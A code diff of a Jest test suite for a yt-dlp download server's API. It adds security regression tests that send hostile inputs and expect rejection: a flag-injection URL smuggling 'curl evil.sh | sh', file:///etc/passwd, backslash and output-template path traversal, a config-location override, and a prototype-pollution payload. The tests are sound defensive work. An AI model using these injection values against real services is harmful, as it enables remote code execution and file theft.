@@ -1,15 +1,15 @@
 import { jest } from '@jest/globals';
 import request from 'supertest';
 
-jest.unstable_mockModule('yt-dlp-exec', () => {
-  const mockFn = jest.fn();
-  return { default: mockFn };
+jest.unstable_mockModule('../src/ytdlp-runner.js', () => {
+  const mockDumpJson = jest.fn();
+  return { dumpJson: mockDumpJson };
 });
 
 jest.unstable_mockModule('../src/binary-manager.js', () => {
   const mockCheckBinaries = jest.fn();
   const mockGetBinDir = jest.fn(() => '/tmp/ytdlp-test/bin');
-  const mockEnsureBinDir = jest.fn();
+  const mockResolveBinary = jest.fn((name) => `/tmp/ytdlp-test/bin/${name}`);
   const mockGetLatestYtdlpVersion = jest.fn(() => Promise.resolve('2026.03.17'));
   const mockGetLatestFfmpegVersion = jest.fn(() => Promise.resolve('7.0.2'));
   const mockDownloadBinaries = jest.fn(() => Promise.resolve());
@@ -21,7 +21,7 @@ jest.unstable_mockModule('../src/binary-manager.js', () => {
   return {
     checkBinaries: mockCheckBinaries,
     getBinDir: mockGetBinDir,
-    ensureBinDir: mockEnsureBinDir,
+    resolveBinary: mockResolveBinary,
     getLatestYtdlpVersion: mockGetLatestYtdlpVersion,
     getLatestFfmpegVersion: mockGetLatestFfmpegVersion,
     downloadBinaries: mockDownloadBinaries,
@@ -86,14 +86,14 @@ jest.unstable_mockModule('../src/channel-manager.js', () => {
 
 const mod = await Promise.all([
   import('../server.js'),
-  import('yt-dlp-exec'),
+  import('../src/ytdlp-runner.js'),
   import('../src/binary-manager.js'),
   import('../src/download-queue.js'),
   import('../src/channel-manager.js'),
 ]);
 
 const app = mod[0].default;
-const ytDlp = mod[1].default;
+const runner = mod[1];
 const binaryManager = mod[2];
 const downloadQueue = mod[3];
 const channelManager = mod[4];
@@ -135,7 +135,7 @@ beforeEach(() => {
   binaryManager.getLatestFfmpegVersion.mockResolvedValue('7.0.2');
   binaryManager.downloadBinaries.mockResolvedValue();
 
-  ytDlp.mockResolvedValue({ formats: [{ format_id: 'test', ext: 'mp4' }] });
+  runner.dumpJson.mockResolvedValue({ formats: [{ format_id: 'test', ext: 'mp4' }] });
 });
 
 describe('API Endpoints', () => {
@@ -210,7 +210,7 @@ describe('API Endpoints', () => {
         .post('/api/download/queue')
         .send({})
         .expect(400);
-      expect(res.body).toEqual({ error: 'URL is required' });
+      expect(res.body).toEqual({ error: 'A valid http(s) URL is required' });
     });
 
     it('returns 201 with job ID when URL provided', async () => {
@@ -352,7 +352,7 @@ describe('API Endpoints', () => {
         .post('/api/channels')
         .send({})
         .expect(400);
-      expect(res.body).toEqual({ error: 'URL is required' });
+      expect(res.body).toEqual({ error: 'A valid http(s) URL is required' });
     });
 
     it('returns 201 with channel object', async () => {
@@ -492,11 +492,11 @@ describe('API Endpoints', () => {
         .post('/api/download')
         .send({})
         .expect(400);
-      expect(res.body).toEqual({ error: 'URL is required' });
+      expect(res.body).toEqual({ error: 'A valid http(s) URL is required' });
     });
 
     it('returns 500 if yt-dlp binary not found', async () => {
-      binaryManager.getBinDir.mockReturnValue('/tmp/nonexistent');
+      binaryManager.resolveBinary.mockReturnValue('/tmp/nonexistent/yt-dlp');
 
       const res = await request(app)
         .post('/api/download')
@@ -528,6 +528,126 @@ describe('API Endpoints', () => {
         .get('/api/files/some%2Ffile')
         .expect(400);
       expect(res.body).toEqual({ error: 'Invalid filename' });
+    });
+
+    it('returns 400 for filename with backslash traversal', async () => {
+      const res = await request(app)
+        .get('/api/files/..%5C..%5C..%5CWindows%5Cwin.ini')
+        .expect(400);
+      expect(res.body).toEqual({ error: 'Invalid filename' });
+    });
+
+    it('returns 400 for DELETE with backslash traversal', async () => {
+      const res = await request(app)
+        .delete('/api/files/..%5C..%5Csecret.txt')
+        .expect(400);
+      expect(res.body).toEqual({ error: 'Invalid filename' });
+    });
+  });
+
+  describe('security regressions', () => {
+    it('POST /api/download rejects non-http(s) URL values that could be parsed as flags', async () => {
+      const res = await request(app)
+        .post('/api/download')
+        .send({ url: '--exec=sh -c "curl evil.sh | sh"' })
+        .expect(400);
+      expect(res.body).toHaveProperty('error');
+    });
+
+    it('POST /api/download rejects file:// URLs', async () => {
+      const res = await request(app)
+        .post('/api/download')
+        .send({ url: 'file:///etc/passwd' })
+        .expect(400);
+      expect(res.body).toHaveProperty('error');
+    });
+
+    it('POST /api/download/queue rejects flag-injection URLs', async () => {
+      const res = await request(app)
+        .post('/api/download/queue')
+        .send({ url: '--exec=evil' })
+        .expect(400);
+      expect(res.body).toHaveProperty('error');
+      expect(downloadQueue.addJob).not.toHaveBeenCalled();
+    });
+
+    it('POST /api/download/queue rejects output templates with traversal', async () => {
+      const res = await request(app)
+        .post('/api/download/queue')
+        .send({ url: 'https://example.com/video', outputTemplate: '../../.ssh/evil' })
+        .expect(400);
+      expect(res.body).toEqual({ error: 'Invalid output template' });
+    });
+
+    it('POST /api/download rejects output templates with path separators', async () => {
+      const res = await request(app)
+        .post('/api/download')
+        .send({ url: 'https://example.com/video', outputTemplate: 'sub/dir/%(title)s.%(ext)s' })
+        .expect(400);
+      expect(res.body).toEqual({ error: 'Invalid output template' });
+    });
+
+    it('POST /api/channels rejects flag-injection URLs', async () => {
+      const res = await request(app)
+        .post('/api/channels')
+        .send({ url: '--config-location=/tmp/evil.conf' })
+        .expect(400);
+      expect(res.body).toHaveProperty('error');
+      expect(channelManager.subscribe).not.toHaveBeenCalled();
+    });
+
+    it('POST /api/options/apply ignores prototype pollution keys', async () => {
+      const res = await request(app)
+        .post('/api/options/apply')
+        .send({ options: { __proto__: { polluted: true }, '--verbose': true } })
+        .expect(200);
+      expect(res.body).toHaveProperty('success', true);
+      const status = await request(app).get('/api/status').expect(200);
+      expect(JSON.stringify(status.body.options)).not.toContain('polluted');
+    });
+
+    it('POST /api/options/apply does not corrupt the option catalogue', async () => {
+      const res = await request(app)
+        .post('/api/options/apply')
+        .send({ options: { '--verbose': true } })
+        .expect(200);
+      expect(res.body).toEqual({ success: true, applied: ['--verbose'] });
+
+      const opts = await request(app).get('/api/options').expect(200);
+      expect(Array.isArray(opts.body.general)).toBe(true);
+      expect(opts.body.general[0]).toHaveProperty('flag');
+    });
+
+    it('POST /api/options/apply rejects unknown keys', async () => {
+      const res = await request(app)
+        .post('/api/options/apply')
+        .send({ options: { '--not-a-real-flag': true, '--retries': '3' } })
+        .expect(200);
+      expect(res.body.applied).toEqual(['--retries']);
+    });
+
+    it('POST /api/download/queue/cancel/:id cancels a job without removing it', async () => {
+      const res = await request(app)
+        .post('/api/download/queue/cancel/job-1')
+        .expect(200);
+      expect(res.body).toEqual({ success: true, message: 'Job paused' });
+      expect(downloadQueue.cancelJob).toHaveBeenCalledWith('job-1');
+    });
+
+    it('GET /api/format-list rejects non-http(s) URLs', async () => {
+      const res = await request(app)
+        .get('/api/format-list?url=--exec%3Devil')
+        .expect(400);
+      expect(res.body).toHaveProperty('error');
+    });
+
+    it('POST /api/download/queue/batch rejects invalid URLs', async () => {
+      const res = await request(app)
+        .post('/api/download/queue/batch')
+        .send({ urls: ['https://example.com/video', '--exec=evil'] })
+        .expect(400);
+      expect(res.body).toHaveProperty('error');
+      expect(downloadQueue.addJob).not.toHaveBeenCalled();
     });
   });
 });
